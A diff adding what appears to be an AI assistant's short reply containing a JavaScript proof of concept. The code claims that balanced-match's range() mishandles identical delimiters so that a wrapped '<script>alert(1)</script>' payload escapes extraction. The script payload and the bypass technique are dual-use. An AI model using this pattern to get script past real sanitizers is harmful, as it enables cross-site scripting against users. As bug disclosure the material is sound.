@@ -1,0 +1,34 @@
+Confirmed — the malicious content lands entirely in `pre` and `body` is falsely empty. Here's the exploit:
+
+```javascript
+// Exploit for balanced-match's `range` function (v0.4.2, and any version
+// prior to the a===b fix).
+//
+// When the opening and closing delimiters are identical (e.g. markdown
+// code fences ```, underscores ___, or any same-token wrapper), range()
+// fails to special-case that scenario. Instead of returning the span
+// between the FIRST and SECOND occurrence of the delimiter, it walks the
+// whole delimiter stack and collapses onto the span between the SECOND
+// and SECOND occurrence, i.e. a zero-width match anchored at the last
+// delimiter it saw. Any code that trusts balanced-match to locate,
+// sanitize, or strip delimited content (templating engines, markdown
+// stripping, tag-balance checks) will treat everything up to and
+// including the attacker payload as inert "pre" text, and report an
+// empty "body" -- silently missing/failing to sanitize the payload.
+
+const balanced = require("balanced-match");
+
+const payload = 'PRE ___<script>alert(1)</script>___ POST';
+
+const r = balanced.range('___', '___', payload);
+console.log('range() result:', r); // expected [4, 32] (first..second delim), got a bogus zero-width span
+
+const result = balanced('___', '___', payload);
+console.log('balanced() result:', result);
+
+if (r[0] !== 4 || result.body === '') {
+  console.log('VULNERABLE: delimiter-matching is broken when a === b.');
+  console.log('Attacker payload smuggled into "pre" instead of extracted "body":');
+  console.log('  ' + result.pre);
+}
+```
